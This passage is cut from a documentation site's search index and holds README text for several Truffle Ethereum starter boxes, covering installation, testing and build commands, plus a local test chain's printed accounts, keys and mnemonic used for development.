compile compile contracts truffle migrate migrate contracts Read more in http://truffleframework.com/docs/", "title": "Contracts sub project"}, {"location": "boxes/truffle-react-redux/#web-sub-project", "text": "Create React App : Create React apps with no build configuration. Redux : State management. redux-devtools-extension drizzle : Redux store for web3 and smart contracts. Maintains access to underlying functionality ex: Web3 and your contract's methods. react-router : Declarative routing for React react-intl : Internationalize React apps redux-logger Logger (middleware) for Redux in development command description npm start Runs the app in the development mode npm test Launches the test runner in the interactive watch mode npm test -- --coverage Run test once and show the test coverage Read more in https://github.com/facebook/create-react-app/blob/master/packages/react-scripts/template/README.md", "title": "Web sub project"}, {"location": "boxes/truffle-react-redux/#test-chain-detail", "text": "Available Accounts ================== (0) 0x1d489c3f8ed5ee71325a847888b2157c9ac29c05 (~100 ETH) (1) 0x1ce421937a6f59bf58faafe316d23aaed690da18 (~100 ETH) (2) 0x6dbc30ff01a1066ba5af9dfa7b838f4932995b4b (~100 ETH) (3) 0x4a6bfc37b3f0f511310e6d0e4dcbdac99f5899c5 (~100 ETH) (4) 0xfd1f713d6e8101aab1aeaaec4aad7380442d6042 (~100 ETH) (5) 0x4db199fefe8b4a1cd8027c546519498b75e77292 (~100 ETH) (6) 0xba27d6c39dfa9d2a42f91aa5043817c325ec7b43 (~100 ETH) (7) 0x35ace72f822f3adbd4cfa633358d5ed7161fa76e (~100 ETH) (8) 0x68ad18971b17c434aa39f022451c29bdb99e19bf (~100 ETH) (9) 0xc6b346f43e3a1a60ef3d378d07486fb518f5eb2b (~100 ETH) Private Keys ================== (0) 0xbea70301d065cf7946f25251c73dbfff93d4320715e43bdc0d5087553074cb64 (1) 0x8c90c6365f62ff46b3a04edc5dbae3f401f36a50ce5f6da03ba12c08d8a72478 (2) 0xfa2fe8493616350833f4e8979276e0297dab4db889e18a8a33a49c024d3888f0 (3) 0x52f3756c688192c59d372825a2a581ed685a6efe032a343116cf5ed084f7d713 (4) 0xe7ea2af66e409f10ad4e3a06496b59c230363988879a1609d8fa5414c25feb2a (5) 0xaab4090f43e729d2d04f34c93ed441c9903be85c0a227922cb66aac705a6a0da (6) 0x5bbd4586b26aa73bbc162e8ab9e3c13b44fd204434f5fac7d57b256bdae09ef4 (7) 0xf63ca261915e41c1f2dcb8535ce14c5b1e675f3ff01515de820819477d37812c (8) 0xf15be1c6e435585c3b8e568167dd7067c0fc732422421e1f9f3e437ae65a6ce8 (9) 0x55b842b841e2e082d178d7a63c95288f90bb69354064e75c2e6cb7d94f7ecada HD Wallet ================== Mnemonic: mandate wagon sample embrace law ghost join friend tray onion dose dynamic Base HD Path: m/44'/60'/0'/0/{account_index} Gas Price ================== 20000000000 Gas Limit ================== 6721975 Listening on 127.0.0.1:8545", "title": "Test chain detail"}, {"location": "boxes/truffle-react-redux/#support-developer-team", "text": "If truffle-react-redux made your life easier and you like it and want to help us improve it further or if you want to speed up new features, please, support us with a tip. We appreciate all contributions!", "title": "Support Developer Team"}, {"location": "boxes/truffle-react-ts-template/", "text": "Truffle React TypeScript Template \u00b6 Getting Started \u00b6 Install Truffle and an Ethereum client - like EthereumJS TestRPC . npm install -g truffle npm install -g ethereumjs-testrpc Launch testrpc . testrpc <options> Migrate the contracts with truffle. truffle migrate Run the webpack server for front-end hot reloading npm run dev Tests \u00b6 This box comes with truffle contracts testing and front-end testing with jest 1. Truffle contract tests truffle test 1. Jest tests npm run test Building for Production \u00b6 Migrate the contracts with truffle. truffle migrate Create production bundle npm run build The production build will be compiled in the build/app folder. Directory Structure \u00b6 \\build \\app (Production app dist ) \\contracts (Migrated contracts) \\config \\jest (Jest config and polyfills) \\contracts (Solidity source) \\migrations (Migration scripts) \\public (Public html) \\src (React app source) \\test (Contract tests) FAQ \u00b6 My imported CSS doesn't work? I use CSS modules in webpack. If you don't want it, open webpack.config.ts , change modules: true to modules: false under css-loader . Can I change what gets included in the vendor bundle? Open webpack.config.ts and edit the vendor_bundle array under entry .", "title": "Index"}, {"location": "boxes/truffle-react-ts-template/#truffle-react-typescript-template", "text": "", "title": "Truffle React TypeScript Template"}, {"location": "boxes/truffle-react-ts-template/#getting-started", "text": "Install Truffle and an Ethereum client - like EthereumJS TestRPC . npm install -g truffle npm install -g ethereumjs-testrpc Launch testrpc . testrpc <options> Migrate the contracts with truffle. truffle migrate Run the webpack server for front-end hot reloading npm run dev", "title": "Getting Started"}, {"location": "boxes/truffle-react-ts-template/#tests", "text": "This box comes with truffle contracts testing and front-end testing with jest 1. Truffle contract tests truffle test 1. Jest tests npm run test", "title": "Tests"}, {"location": "boxes/truffle-react-ts-template/#building-for-production", "text": "Migrate the contracts with truffle. truffle migrate Create production bundle npm run build The production build will be compiled in the build/app folder.", "title": "Building for Production"}, {"location": "boxes/truffle-react-ts-template/#directory-structure", "text": "\\build \\app (Production app dist ) \\contracts (Migrated contracts) \\config \\jest (Jest config and polyfills) \\contracts (Solidity source) \\migrations (Migration scripts) \\public (Public html) \\src (React app source) \\test (Contract tests)", "title": "Directory Structure"}, {"location": "boxes/truffle-react-ts-template/#faq", "text": "My imported CSS doesn't work? I use CSS modules in webpack. If you don't want it, open webpack.config.ts , change modules: true to modules: false under css-loader . Can I change what gets included in the vendor bundle? Open webpack.config.ts and edit the vendor_bundle array under entry .", "title": "FAQ"}, {"location": "boxes/truffle-security/", "text": "Truffle Security \u00b6 This is a Truffle Box providing the security infrastructure for your DApp backend. It aims to be a single box that meets all your requirements to write secure solidity smart contracts and is Solium 's official box for Truffle. Installation & Usage \u00b6 Install Truffle globally npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox UtkarshGupta-CS/truffle-security Compile the Contracts truffle compile Deploy the compiled contracts truffle migrate Linting the Solidity Contracts npm run lint:sol Available Integrations \u00b6 Style & Security linting with Solium Roadmap \u00b6 Zeppelin Contracts as dependancy Support for Zeppelin's contract upgrading pattern Security analysis using Oyente Contributions \u00b6 We aim for this project to be community-governed. We therefore invite one and all to suggest improvements and features, assist us on Licensing issues, discuss the future of DApp security and contribute in any way you can! Maintainers \u00b6 Utkarsh Gupta Raghav Dua See the Wiki for complete documentation.", "title": "Truffle Security"}, {"location": "boxes/truffle-security/#truffle-security", "text": "This is a Truffle Box providing the security infrastructure for your DApp backend. It aims to be a single box that meets all your requirements to write secure solidity smart contracts and is Solium 's official box for Truffle.", "title": "Truffle Security"}, {"location": "boxes/truffle-security/#installation-usage", "text": "Install Truffle globally npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox UtkarshGupta-CS/truffle-security Compile the Contracts truffle compile Deploy the compiled contracts truffle migrate Linting the Solidity Contracts npm run lint:sol", "title": "Installation &amp; Usage"}, {"location": "boxes/truffle-security/#available-integrations", "text": "Style & Security linting with Solium", "title": "Available Integrations"}, {"location": "boxes/truffle-security/#roadmap", "text": "Zeppelin Contracts as dependancy Support for Zeppelin's contract upgrading pattern Security analysis using Oyente", "title": "Roadmap"}, {"location": "boxes/truffle-security/#contributions", "text": "We aim for this project to be community-governed. We therefore invite one and all to suggest improvements and features, assist us on Licensing issues, discuss the future of DApp security and contribute in any way you can!", "title": "Contributions"}, {"location": "boxes/truffle-security/#maintainers", "text": "Utkarsh Gupta Raghav Dua See the Wiki for complete documentation.", "title": "Maintainers"}, {"location": "boxes/truffle-shavings/", "text": "Truffle Shavings \u00b6 Truffle Boilerplate with solium, linguist, zeppelin, migrations, tests &tc \u00b6 Install \u00b6 git clone git@github.com:okwme/truffle-shavings.git cd truffle shavings yarn or npx truffle unbox okwme/truffle-shavings // then create a .env file that looks like this: TRUFFLE_MNEMONIC=candy maple cake sugar pudding cream honey rich smooth crumble sweet treat GANACHE_MNEMONIC=grid voyage cream cry fence load stove sort grief fuel room save TESTNET_MNEMONIC=a twelve word mnemonic phrase that works with some test network buddy INFURA_API_KEY=yOUrInfURaKEy Run \u00b6 yarn lint:watch Test \u00b6 truffle develop yarn test Deploy \u00b6 truffle develop yarn deploy --network develop // this just runs truffle migrate --reset --compile-all", "title": "Index"}, {"location": "boxes/truffle-shavings/#truffle-shavings", "text": "", "title": "Truffle Shavings"}, {"location": "boxes/truffle-shavings/#truffle-boilerplate-with-solium-linguist-zeppelin-migrations-tests-tc", "text": "", "title": "Truffle Boilerplate with solium, linguist, zeppelin, migrations, tests &amp;tc"}, {"location": "boxes/truffle-shavings/#install", "text": "git clone git@github.com:okwme/truffle-shavings.git cd truffle shavings yarn or npx truffle unbox okwme/truffle-shavings // then create a .env file that looks like this: TRUFFLE_MNEMONIC=candy maple cake sugar pudding cream honey rich smooth crumble sweet treat GANACHE_MNEMONIC=grid voyage cream cry fence load stove sort grief fuel room save TESTNET_MNEMONIC=a twelve word mnemonic phrase that works with some test network buddy INFURA_API_KEY=yOUrInfURaKEy", "title": "Install"}, {"location": "boxes/truffle-shavings/#run", "text": "yarn lint:watch", "title": "Run"}, {"location": "boxes/truffle-shavings/#test", "text": "truffle develop yarn test", "title": "Test"}, {"location": "boxes/truffle-shavings/#deploy", "text": "truffle develop yarn deploy --network develop // this just runs truffle migrate --reset --compile-all", "title": "Deploy"}, {"location": "boxes/truffle-starter/", "text": "Caster.io Truffle Starter Box \u00b6 Use this Truffle Framework starter box with the Caster.io Blockchain track lessons. Installation \u00b6 Install truffle globally npm install truffle -g Unpack the box with truffle unbox CasterIO/truffle-starter Using Docker \u00b6 If you encounter issues building the project locally, you can use the provided Docker image. Note: This method will not update your Docker image each time you change the code. After every code change, you will need to redeploy your docker container using the following steps: # deploy your Solidity contract truffle migrate # build the Docker image docker build -t caster_truffle:latest . # launch the Docker container docker run -p 3000:3000 caster_truffle:latest", "title": "Index"}, {"location": "boxes/truffle-starter/#casterio-truffle-starter-box", "text": "Use this Truffle Framework starter box with the Caster.io Blockchain track lessons.", "title": "Caster.io Truffle Starter Box"}, {"location": "boxes/truffle-starter/#installation", "text": "Install truffle globally npm install truffle -g Unpack the box with truffle unbox CasterIO/truffle-starter", "title": "Installation"}, {"location": "boxes/truffle-starter/#using-docker", "text": "If you encounter issues building the project locally, you can use the provided Docker image. Note: This method will not update your Docker image each time you change the code. After every code change, you will need to redeploy your docker container using the following steps: # deploy your Solidity contract truffle migrate # build the Docker image docker build -t caster_truffle:latest . # launch the Docker container docker run -p 3000:3000 caster_truffle:latest", "title": "Using Docker"}, {"location": "boxes/truffle-ts-percel-box/", "text": "truffle-ts-percel-box \u00b6 This box is a sample that use Web3 1.0.0-beta and TypeScript 2.8, percel, metacoin box. I'm happy if this sample is useful for learning etheruem. Installation \u00b6 Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox YuichiNukiyama / truffle - ts - percel - box NOTE : This box depend on Web3.js 1.0.0-beta. And this package can't install on Windows without build-tools. If you want to use this sample on Windows, execute following script before truffle unbx : // You shoud execute with administrator authority. npm install -- global -- production windows - build - tools Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the percel development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:1234 npm run dev Cleanup extra data after stop truffle and percel. javascript npm run clean Acknowledgements \u00b6 I referred to the following box. Thank you for authors :smile: metacoin tutorialtoken", "title": "truffle-ts-percel-box"}, {"location": "boxes/truffle-ts-percel-box/#truffle-ts-percel-box", "text": "This box is a sample that use Web3 1.0.0-beta and TypeScript 2.8, percel, metacoin box. I'm happy if this sample is useful for learning etheruem.", "title": "truffle-ts-percel-box"}, {"location": "boxes/truffle-ts-percel-box/#installation", "text": "Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox YuichiNukiyama / truffle - ts - percel - box NOTE : This box depend on Web3.js 1.0.0-beta. And this package can't install on Windows without build-tools. If you want to use this sample on Windows, execute following script before truffle unbx : // You shoud execute with administrator authority. npm install -- global -- production windows - build - tools Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the percel development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:1234 npm run dev Cleanup extra data after stop truffle and percel. javascript npm run clean", "title": "Installation"}, {"location": "boxes/truffle-ts-percel-box/#acknowledgements", "text": "I referred to the following box. Thank you for authors :smile: metacoin tutorialtoken", "title": "Acknowledgements"}, {"location": "boxes/truffle-vue/", "text": "Vue.js truffle box \u00b6 A truffle box to serve as the foundation of any Truffle and Vue.js dApp. Comes with Vue.js , vue-router , Vuex and sass-loader . A minimalist user authentication smart contract is also provided. Directory structure \u00b6 This truffle box is crafted to enforce a clean directory structure. / | +-- build/ | | | +-- contracts/ | | | | | + truffle compiled contracts | +-- config/ | | | +-- babel/ | | | | | + babel config files - to come (babel does not allow to specify a custom config file path - yet - so the babel configuration occurs in the package.json file for now) | | | +-- eslint/ | | | | | + estlint config files | | | +-- postcss/ | | | | | + postcss config files | | | +-- vue-loader | | | | | + vue-loader config files | | | +-- webpack/ | | | | | + webpack config files | +-- contracts/ | | | + solidity contracts | +-- migrations/ | | | + truffle migrations files | +-- scripts/ | | | + webpack scripts | +-- src/ | | | + vue.js dapp files | +-- static/ | | | + vue.js dapp static files | +-- test/ | | | +-- e2e/ | | | | | + e2e test files | | | +-- truffle/ | | | | | + truffle test files | | | +-- unit/ | | | | | + unit test files Installation \u00b6 Install Truffle and an Ethereum client - like EthereumJS TestRPC . npm install -g truffle // Version 3.0.5+ required. npm install -g ethereumjs-testrpc Download this box. truffle unbox wespr/truffle-vue Launch testrpc . testrpc <options> Compile and migrate the contracts. truffle compile truffle migrate Run the webpack server for front-end hot reloading. Smart contract changes do not support hot reloading for now. npm run start Tests \u00b6 This box comes with everything bundled for unit , e2e and truffle contracts testing. unit and e2e tests. npm run test/dapp truffle contracts tests. npm run test/truffle Alternatively you can directly run unit , e2e and truffle contracts tests in one command. npm run test Build for production \u00b6 To build the application for production, use the build command. A production build will be compiled in the dist folder. npm run build Issues \u00b6 Please send any bug issues or proposal for improvement to Issues .", "title": "Vue.js truffle box"}, {"location": "boxes/truffle-vue/#vuejs-truffle-box", "text": "A truffle box to serve as the foundation of any Truffle and Vue.js dApp. Comes with Vue.js , vue-router , Vuex and sass-loader . A minimalist user authentication smart contract is also provided.", "title": "Vue.js truffle box"}, {"location": "boxes/truffle-vue/#directory-structure", "text": "This truffle box is crafted to enforce a clean directory structure. / | +-- build/ | | | +-- contracts/ | | | | | + truffle compiled contracts | +-- config/ | | | +-- babel/ | | | | | + babel config files - to come (babel does not allow to specify a custom config file path - yet - so the babel configuration occurs in the package.json file for now) | | | +-- eslint/ | | | | | + estlint config files | | | +-- postcss/ | | | | | + postcss config files | | | +-- vue-loader | | | | | + vue-loader config files | | | +-- webpack/ | | | | | + webpack config files | +-- contracts/ | | | + solidity contracts | +-- migrations/ | | | + truffle migrations files | +-- scripts/ | | | + webpack scripts | +-- src/ | | | + vue.js dapp files | +-- static/ | | | + vue.js dapp static files | +-- test/ | | | +-- e2e/ | | | | | + e2e test files | | | +-- truffle/ | | | | | + truffle test files | | | +-- unit/ | | | | | + unit test files", "title": "Directory structure"}, {"location": "boxes/truffle-vue/#installation", "text": "Install Truffle and an Ethereum client - like EthereumJS TestRPC . npm install -g truffle // Version 3.0.5+ required. npm install -g ethereumjs-testrpc Download this box. truffle unbox wespr/truffle-vue Launch testrpc . testrpc <options> Compile and migrate the contracts. truffle compile truffle migrate Run the webpack server for front-end hot reloading. Smart contract changes do not support hot reloading for now. npm run start", "title": "Installation"}, {"location": "boxes/truffle-vue/#tests", "text": "This box comes with everything bundled for unit , e2e and truffle contracts testing. unit and e2e tests. npm run test/dapp truffle contracts tests. npm run test/truffle Alternatively you can directly run unit , e2e and truffle contracts tests in one command. npm run test", "title": "Tests"}, {"location": "boxes/truffle-vue/#build-for-production", "text": "To build the application for production, use the build command. A production build will be compiled in the dist folder. npm run build", "title": "Build for production"}, {"location": "boxes/truffle-vue/#issues", "text": "Please send any bug issues or proposal for improvement to Issues .", "title": "Issues"}, {"location": "boxes/tutorialtoken/", "text": "This box is deprecated. It is likely some features in this box will not work as expected. \u00b6 Consider following this tutorial to create an ERC20 with truffle instead. TutorialToken Truffle Box \u00b6 This box has all you need to get started with our Open Zeppelin (TutorialToken) tutorial . Installation \u00b6 Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox tutorialtoken Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the liteserver development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:3000 npm run dev NOTE : This box is not a complete dapp, but the starting point for the Open Zeppelin (TutorialToken) tutorial . You'll need to complete that for this to function. FAQ \u00b6 How do I use this with the EthereumJS TestRPC? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll also need to update line 16 of src/js/app.js .", "title": "Index"}, {"location": "boxes/tutorialtoken/#this-box-is-deprecated-it-is-likely-some-features-in-this-box-will-not-work-as-expected", "text": "Consider following this tutorial to create an ERC20 with truffle instead.", "title": "This box is deprecated. It is likely some features in this box will not work as expected."}, {"location": "boxes/tutorialtoken/#tutorialtoken-truffle-box", "text": "This box has all you need to get started with our Open Zeppelin (TutorialToken) tutorial .", "title": "TutorialToken Truffle Box"}, {"location": "boxes/tutorialtoken/#installation", "text": "Install Truffle globally. npm install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox tutorialtoken Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the liteserver development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated. // Serves the front-end on http://localhost:3000 npm run dev NOTE : This box is not a complete dapp, but the starting point for the Open Zeppelin (TutorialToken) tutorial . You'll need to complete that for this to function.", "title": "Installation"}, {"location": "boxes/tutorialtoken/#faq", "text": "How do I use this with the EthereumJS TestRPC? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll also need to update line 16 of src/js/app.js .", "title": "FAQ"}, {"location": "boxes/upgradable-proxy-box/", "text": "Upgradable-Proxy-Box \u00b6 This box comes with everything you need to build upgradable-proxy contracts. We also have a simple react-app shipped along with it that you can use to see how you can update a contract without losing any data . Installation \u00b6 First ensure that you are in an empty repository. Create a new directory and unbox the box using unbox command using truffle mkdir proxyBox cd proxyBox truffle unbox pranav-singhal/upgradable-proxy-box Install the box dependencies yarn install Run the development console truffle dev OR ``bash truffle develop 4. In the console now open run the `compile` and `migrate` ```js compile // compile the contracts migrate // migrate the contracts This will compile and migrate your contracts. It will also create the ABIs and put them inside the app` folder Go into your app folder and yarn install the react app cd app yarn install In the same folder, yarn start the react app yarn start How it Works \u00b6 The box has three parts Contracts There are 4 Primary Contracts 1. TokenStorage.sol - The contract that stores all the storage variables, their getter and setter functions. All storage variables must be defined inside this contract 2. TokenProxy.sol - This contract acts as the face of entire Dapp, all the calls from the client (web3) are made to this contract and this contract delagates request to the implementation contract. 3. Token_V0.sol - The first version of the implementation contract 4. Token_V1.sol - The second version of the implementation contract For Providing upgradeable nature to the Dapp, we write deploy 3 different contracts instead of just one. These contracts work hand in hand as shown in the flow chart below. Flow Chart \u00b6 The basic idea is to separate the storage from the business logic . Hence the Storage( TokenStorage.sol ) (which includes, mappings and all the state variables) is deployed in a separate contract with all the getters and setters. The Implementation Contract( Token_V0.sol & Token_V1.sol ) makes use of the storage contract for all of it's state variables. The Proxy Contract( Token Proxy.sol ) acts as the face of all the contracts. This contract delegates call to the implementation contract which then uses Storage Contract . Now, everytime we need to upgrade our implementation logic, we just need to deploy a new Implementation Contract , and then call the upgradeTo function on Proxy Contract so that it starts delegating its call to the latest implementation contract. And hence, the storage is preserved and the calls from the browser are still made to the same Proxy Contract. You can read more about how these contracts work here Web3 the Web3 folder inside the app directory gives you code for how to use the web3.js library to write Dapp code that can be used between different versions of your dapp. React App using the contracts and the web3 code, we have built a sample dapp that provides a dynamic interface that changes with different versions of the Dapp. Contributors \u00b6 Arvind Kalra Pranav Singhal Also checkout this box that we've previously built to see how to use express with your Dapp", "title": "Upgradable-Proxy-Box"}, {"location": "boxes/upgradable-proxy-box/#upgradable-proxy-box", "text": "This box comes with everything you need to build upgradable-proxy contracts. We also have a simple react-app shipped along with it that you can use to see how you can update a contract without losing any data .", "title": "Upgradable-Proxy-Box"}, {"location": "boxes/upgradable-proxy-box/#installation", "text": "First ensure that you are in an empty repository. Create a new directory and unbox the box using unbox command using truffle mkdir proxyBox cd proxyBox truffle unbox pranav-singhal/upgradable-proxy-box Install the box dependencies yarn install Run the development console truffle dev OR ``bash truffle develop 4. In the console now open run the `compile` and `migrate` ```js compile // compile the contracts migrate // migrate the contracts This will compile and migrate your contracts. It will also create the ABIs and put them inside the app` folder Go into your app folder and yarn install the react app cd app yarn install In the same folder, yarn start the react app yarn start", "title": "Installation"}, {"location": "boxes/upgradable-proxy-box/#how-it-works", "text": "The box has three parts Contracts There are 4 Primary Contracts 1. TokenStorage.sol - The contract that stores all the storage variables, their getter and setter functions. All storage variables must be defined inside this contract 2. TokenProxy.sol - This contract acts as the face of entire Dapp, all the calls from the client (web3) are made to this contract and this contract delagates request to the implementation contract. 3. Token_V0.sol - The first version of the implementation contract 4. Token_V1.sol - The second version of the implementation contract For Providing upgradeable nature to the Dapp, we write deploy 3 different contracts instead of just one. These contracts work hand in hand as shown in the flow chart below.", "title": "How it Works"}, {"location": "boxes/upgradable-proxy-box/#flow-chart", "text": "The basic idea is to separate the storage from the business logic . Hence the Storage( TokenStorage.sol ) (which includes, mappings and all the state variables) is deployed in a separate contract with all the getters and setters. The Implementation Contract( Token_V0.sol & Token_V1.sol ) makes use of the storage contract for all of it's state variables. The Proxy Contract( Token Proxy.sol ) acts as the face of all the contracts. This contract delegates call to the implementation contract which then uses Storage Contract . Now, everytime we need to upgrade our implementation logic, we just need to deploy a new Implementation Contract , and then call the upgradeTo function on Proxy Contract so that it starts delegating its call to the latest implementation contract. And hence, the storage is preserved and the calls from the browser are still made to the same Proxy Contract. You can read more about how these contracts work here Web3 the Web3 folder inside the app directory gives you code for how to use the web3.js library to write Dapp code that can be used between different versions of your dapp. React App using the contracts and the web3 code, we have built a sample dapp that provides a dynamic interface that changes with different versions of the Dapp.", "title": "Flow Chart"}, {"location": "boxes/upgradable-proxy-box/#contributors", "text": "Arvind Kalra Pranav Singhal Also checkout this box that we've previously built to see how to use express with your Dapp", "title": "Contributors"}, {"location": "boxes/vue-box/", "text": "Vue Truffle Box \u00b6 This box comes with everything you need to start using smart contracts from a vue app. Installation \u00b6 Install Truffle globally. yarn install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox standup75 / vue - box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate If it's the first you attempt to compile and migrate a smart contract, I learned this here: https://medium.com/@mvmurthy/full-stack-hello-world-voting-ethereum-dapp-tutorial-part-2-30b3d335aa1f Run the local server. // Serves the front-end on http://localhost:3000 yarn serve Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. truffle test To build the application for production, use the build command. A production build will be in the build_webpack folder. yarn build", "title": "Vue Truffle Box"}, {"location": "boxes/vue-box/#vue-truffle-box", "text": "This box comes with everything you need to start using smart contracts from a vue app.", "title": "Vue Truffle Box"}, {"location": "boxes/vue-box/#installation", "text": "Install Truffle globally. yarn install - g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox standup75 / vue - box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate If it's the first you attempt to compile and migrate a smart contract, I learned this here: https://medium.com/@mvmurthy/full-stack-hello-world-voting-ethereum-dapp-tutorial-part-2-30b3d335aa1f Run the local server. // Serves the front-end on http://localhost:3000 yarn serve Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. truffle test To build the application for production, use the build command. A production build will be in the build_webpack folder. yarn build", "title": "Installation"}, {"location": "boxes/vue-dark-chocolate/", "text": "vue-dark-chocolate \u00b6 A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex , Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack . The sample uses webpack-dev-server for hot-reloading or you can build and serve from express . This truffle box has a simplistic smart contract model for registering/tracking trades between two accounts, written in Solidity. A vendor account registers the trade and the counterparty account has to certify it. The logic is implemented in the smart contracts to support the full trade flow but the frontend is not fully wired-up. A good exercise is to finish wiring up the frontend to go through the entire flow of registering a trade and having the counterparty certify. This provides a complete view of reading and writing to smart contracts from a dApp via truffle and web3 APIs. The sample also uses a few web3 utility methods that demonstrate how you can convert between strings/hex values from the frontend JavaScript all the way through to Solidity smart contracts on the Ethereum blockchain. This has only been tested on Windows but should work just as well on Linux (said no one ever) . Restart-TestRpcInstance.ps1 is the only real Windows specific item, unless you have PowerShell on Linux . That said, it just stops/starts a testrpc instance with defaults geared towards easily running this box so should be fairly easy to adapt. To help reduce the learning curve to get started with Ethereum Blockchain and Truffle suite this sample includes some test data (in the form of testrpc accounts) and data seeding for smart contracts. To get started, you'll need to load the accounts in to Metamask. Check out testrpc-sample.md and use Metamask to import the HD Wallet mnemonic. Usage \u00b6 If you landed here you probably already have truffle, but just in case: npm install -g truffle To initialize a project with this example, run truffle unbox kierenh/vue-dark-chocolate inside an empty directory. The Ethereum test server npm install -g ethereumjs-testrpc Install metamask (see also: Truffle and Metamask ) Building and running smart contract unit tests \u00b6 Start an rpc instance Restart-TestRpcInstance.ps1 -networkID: 27666 (27666 is the ID of the network which is used at unit test time to skip data seeding, see truffle.js config) Run truffle compile Then run truffle test --network development-no-data-seed to deploy and test the contracts on the 'development-no-data-seed' network Highly recommend checking out the testing doc. At the very least, it's good to be aware of the CLEAN-ROOM ENVIRONMENT approach: CLEAN-ROOM ENVIRONMENT Truffle provides a clean room environment when running your test files. When running your tests against the TestRPC, Truffle will use the TestRPC's advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against. Building and running (interact via truffle console) \u00b6 Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run truffle console See sample_console.md which shows how you can interact with the contracts via the console To exit .exit Building and running the frontend (hot-reloading) \u00b6 Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run npm run dev to build the app and serve it on http://localhost:8081 (with support for hot reloading) Building and running the frontend (express) \u00b6 Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run npm run build (see the output in the build folder) Then run npm start to start the express server (serves the static content from the build folder) On migrations \u00b6 In combination with smart contract design, how migrations work, and how you reference deployed contracts is fairly fundamental, so just wanted to callout these docs to accelerate your learning (hopefully). The Migrations contract stores (in last_completed_migration) a number that corresponds to the last applied \"migration\" script, found in the migrations folder. Deploying this Migrations contract is always the first such step anyway. The numbering convention is x_script_name.js, with x starting at 1. Your real-meat contracts would typically come in scripts starting at 2_.... So, as this Migrations contract stores the number of the last deployment script applied, Truffle will not run those scripts again. On the other hand, in the future, your app may need to have a modified, or new, contract deployed. For that to happen, you create a new script with an increased number that describes the steps that need to take place. Then, again, after they have run once, they will not run again. what are truffle migrations on stackoverflow That's right, they won't run again, ever, so make sure your contract is ready for the wild because once it's on the blockchain, it's there forever! You can't really pull it back and add a field like you might with a database table :) When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that you're Ethereum client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. truffle docs - advanced - configuration#networks Possible upgrades \u00b6 Upgrades welcome, just shoot through a pull request. Listen to events in the TradeRegister.sol and read historical events via web3 event/filter APIs Build and Release from VSTS to an Azure App Service ETHEREUM DEVOPS WITH TRUFFLE, TESTRPC & VISUAL STUDIO TEAM SERVICES & Ethereum DevOps with VSTS \u2013 easier now with new Truffle installer + npx Errors and Troubleshooting \u00b6 Chrome, Metamask & TestRPC \u00b6 After going through the dev-test inner-loop cycle many times, there was an instance where the web app did not retrieve the correct data from the blockchain. There were 2 trades loaded, but I could only retrieve 1, and only for some accounts. In the web app, I could see it was not retrieving the correct number of trades for each actor (and subsequently could not look them up * correctly) by debugging the Javascript In truffle console, I was able to run ad-hoc queries and get the expected results Truffle test - the unit tests were all passing I'm fairly certain I closed/re-opened browser during this time, but what seemed to do the trick was forcing metamask to re-connect to the testrpc instance so I have put this down to a quirk in metamask connecting to testrpc (certainly the versions being used anyway). When I re-selected the network, the page refreshes and the web app returns the correct results. Basically this was just opening metamask and clicking on \"Localhost 8545\" which seemed to trigger some kind of refresh and things started working as expected. This post reports a similar problem: https://stackoverflow.com/questions/45585735/testrpc-the-tx-doesnt-have-the-correct-nonce There doesn't appear to be a great solution, the advice is to close browser instances etc and reconnect to the RPC. truffle test \u00b6 It's important to be aware that tests that don't handle exceptions thrown from within promises correctly can cause subsequent tests to fail with misleading error messages. Perhaps tests in 1 suite work, but when combined with the whole test suite they fail. This is a good indication there's an exception thrown from within a promise is not handled correctly. Be sure to add a catch() handler to the top-level promise. To help troubleshoot, you can isolate tests by running individual files in Truffle. truffle test ./path/to/test/file.js Dev Notes and Links \u00b6 I'll leave the bulk of this to some of the resources I found helpful: solidity docs web3js 1.0 docs webpack A 101 Noob Intro to Programming Smart Contracts on Ethereum Blockchain fundamentals on PluralSight bytes32 VS string types on stackoverflow Solidity - Smart Contract Design - When to use contract and when to use structs on stackoverflow Get started with 